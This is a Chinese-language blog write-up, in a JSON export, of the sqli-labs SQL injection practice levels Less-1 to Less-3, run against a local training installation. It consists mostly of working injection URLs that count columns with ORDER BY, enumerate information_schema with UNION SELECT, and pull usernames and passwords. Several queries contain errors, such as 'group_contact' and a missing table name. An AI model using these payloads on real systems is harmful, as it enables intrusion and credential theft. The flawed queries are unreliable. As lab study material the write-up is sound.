[{"title":"sqli-labs-writeup","date":"2019-12-27T08:36:20.000Z","path":"2019/12/27/sqli-labs-writeup/","text":"一直想着要刷这边的题目，但是一直没抽出时间来（留下了没技术的泪水）。现在补上。。。本文采用每题有新知识点就写一个知识点 关卡题目下载链接：https://github.com/Audi-1/sqli-labs sqli-labsBasicless1题目链接：http://localhost/sqli-labs-master/Less-1/ 进入页面，看见下面这句话： 1Please input the ID as parameter with numeric value 构造playload：http://localhost/sqli-labs-master/Less-1/?id=1 得到： 12Your Login name:DumbYour Password:Dumb 没有报错出现了一个用户名，在 1 后面添加单引号，即 1&#39; 发现报错： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 在后面添加– +将后面的内容直接注释掉，发现没有报错了，尝试order by查询数据库的列数，构造http://localhost/sqli-labs-master/Less-1/?id=1&#39; order by 1 -- + 当尝试到4时发现开始报错 所以已经爆出列数，接下来就是用union select进行联合查询，爆出数据库、表、列名： 12345http://localhost/sqli-labs-master/Less-1/?id=1' union select 1,2,3 -- +http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_contact(schema_name) from information_schema.schemata-- + //获得数据库名security//这边有一个疑问，%23在url编码中是#，如果直接在url输入#不会被编码，以至于会报错，我还没了解到原因然后我改成了-- + 进行注释后面的内容http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_contact(table_name) from information_schema.tables where table_schema= 'security'-- + //获得列表名 userhttp://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name= 'user'-- + //获得列名 由此我们已经可以获取到用户信息了 1http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,username,password from users where id=3 -- + less2进入界面，获得一句话 1Please input the ID as parameter with numeric value 跟less1是一样的，那就先按照less1的步骤来， 构造playload 123http://localhost/sqli-labs-master/Less-2/?id=1 //没有报错http://localhost/sqli-labs-master/Less-2/?id=1' //报错http://localhost/sqli-labs-master/Less-2/?id=1' order by 1-- + //还是报错 所以跟less1是不同的注入方式，尝试不用单引号闭合，而是使用数字进行查询： 12345678http://localhost/sqli-labs-master/Less-2/?id=1 order by 1-- + //正常http://localhost/sqli-labs-master/Less-2/?id=1 order by 2-- + //正常http://localhost/sqli-labs-master/Less-2/?id=1 order by 3-- + //正常http://localhost/sqli-labs-master/Less-2/?id=1 order by 4-- + //报错http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,database() //爆出数据库名'security'http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,table_name from information_schema.tables where table_schema='security' //获得表名'emails'http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,column_name from information_schema.columns where table_schema='emails' //获得列名'id'http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,username,password from where id=3-- + //获得数据 less3进入界面仍然是那句话 1Please input the ID as parameter with numeric value 按照less1的方法继续注入 123http://localhost/sqli-labs-master/Less-3/?id=1http://localhost/sqli-labs-master/Less-3/?id=1' //报错http://localhost/sqli-labs-master/Less-3/?id=1' order by 1-- + //报错 参考其他的writeup，发现是要进行闭合（），所以进行下面的注入 1234567http://localhost/sqli-labs-master/Less-3/?id=1') order by 1-- + //正常http://localhost/sqli-labs-master/Less-3/?id=1') order by 2-- + //正常http://localhost/sqli-labs-master/Less-3/?id=1') order by 3-- + //正常http://localhost/sqli-labs-master/Less-3/?id=1') order by 4-- + //报错http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,2,database()-- + //爆出数据库名‘security’http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,2,table_name from information_schema.tables where table_schema='security'-- + //爆出数据库名‘security’http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,2,column_name from information_schema.columns where table_schema='emails'-- +","tags":[]}]